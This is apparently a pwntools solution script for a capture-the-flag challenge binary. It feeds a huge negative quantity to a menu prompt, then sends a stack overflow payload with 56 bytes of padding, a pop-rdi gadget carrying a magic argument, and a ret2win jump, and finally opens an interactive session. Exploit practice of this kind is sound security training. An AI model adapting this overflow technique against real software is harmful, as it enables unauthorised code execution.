
from pwn import *


e = ELF("./chall")
r = process('./chall')
OFFSET = 56
r.recvuntil(b">")
print("b")
r.sendline(b"4")
r.recvuntil(b"Masukin Jumlahnya:")
print("b")
r.sendline(b"-100000000000000000000000")
r.recvuntil(b">")
print("b")
r.sendline(b"1")
ret2win = e.symbols["printf_something_wrong"]
info(ret2win)
pop_rdi = p64(0x00400c43)
ret = p64(0x00400769)
payload = (
	b"A" * OFFSET +
	pop_rdi +
	p64(0x19b6da8f2bdcb1ee) +
	ret +
	p64(ret2win) +
	p64(0x0)
)
r.recvuntil(b"pre-order ?")
r.sendline(payload)
r.recvuntil(b">")
r.sendline(b"5")
r.clean_and_log()
r.interactive()
